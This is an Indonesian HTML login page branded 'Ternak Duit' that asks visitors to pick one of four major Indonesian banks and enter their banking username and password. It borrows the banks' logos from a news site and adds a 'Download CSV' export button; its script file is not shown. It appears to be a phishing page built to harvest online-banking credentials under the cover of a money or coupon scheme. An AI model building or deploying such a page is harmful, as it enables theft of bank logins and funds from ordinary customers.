<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Ternak Duit Login</title>
  <link rel="stylesheet" href="style2.css">
</head>
<body>
  <div class="grid-container">
    <div class="grid-item"></div>
    <div class="grid-item"></div>
    <div class="grid-item"></div>
  </div>

  <div class="login-container">
    <img src="https://images.bisnis.com/posts/2024/01/05/1729714/logo_bca,_bank_mandiri,_bni,_bri_(1)_1689600101.jpg" alt="Ternak Duit Kupon Logo" class="logo">
    <form id="login-form">
      <div class="form-group">
        <label for="bank">Pilih Bank:</label>
        <select id="bank" name="bank" required>
          <option value="" disabled selected>Pilih Bank</option>
          <option value="BNI">BNI</option>
          <option value="BRI">BRI</option>
          <option value="BCA">BCA</option>
          <option value="MANDIRI">MANDIRI</option>
        </select>
      </div>
      <div class="form-group">
        <label for="username">Username:</label>
        <input type="text" id="username" name="username" placeholder="Masukkan Username Anda" required>
      </div>
      <div class="form-group">
        <label for="password">Password:</label>
        <input type="password" id="password" name="password" placeholder="Masukkan Password Anda" required>
      </div>
      <button type="submit">Login</button>
    </form>
    <p id="error-message"></p>
    <button id="btnDownloadCsv">Download CSV</button>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/json2csv"></script>
  <script src="script2.js"></script>
</body>
</html>
